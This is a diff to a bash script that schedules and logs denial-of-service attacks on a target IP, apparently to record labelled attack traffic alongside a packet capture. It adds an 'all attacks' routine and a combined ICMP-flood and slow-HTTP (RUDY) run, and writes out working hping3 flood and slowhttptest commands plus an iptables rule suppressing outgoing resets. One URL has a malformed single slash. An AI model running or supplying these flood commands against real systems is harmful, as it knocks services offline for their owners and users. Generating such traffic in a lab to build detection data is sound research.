@@ -34,11 +34,23 @@ two_attacks(){
     echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
-    ./two_attacks_starter.sh $1 $2 $3 "$4" "$5"
+    ./two_attacks.sh $1 $2 $3 "$4" "$5"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 }
+
+all_attacks(){
+    #Write to file
+    echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+
+    #Run the attack
+    ./all_attacks.sh $1 $2 $3
+
+    #Write to file
+    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+}
+
 
 ./capture.sh & pid_capture=$!
 
@@ -196,13 +208,26 @@ echo "Break 10 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_
 
 
 
-#Define variables for combined attack 1
+#Define variables for combined attack 2
 attack_type="ICMPandRUDY"
 attack_duration=$((10*60)) # in seconds
 attack_script1="hping3 --flood -1 $destination_ip"
 attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http:/$destination_ip -x 10 -p 3"
 
 two_attacks $attack_type $attack_duration $destination_ip "$attack_script1" "$attack_script2"
+
+#Write to file
+echo "Started break 11" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Wait for next attack
+sleep $((20*60))
+#Write to file
+echo "Break 11 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+
+#Define variables for combined attack 3
+attack_type="All"
+attack_duration=$((12*60)) # in seconds
+
+all_attacks  $attack_type $attack_duration $destination_ip
 
 iptables -D OUTPUT -d ytelse1.uninett.no -p tcp --tcp-flags RST RST -j DROP
 
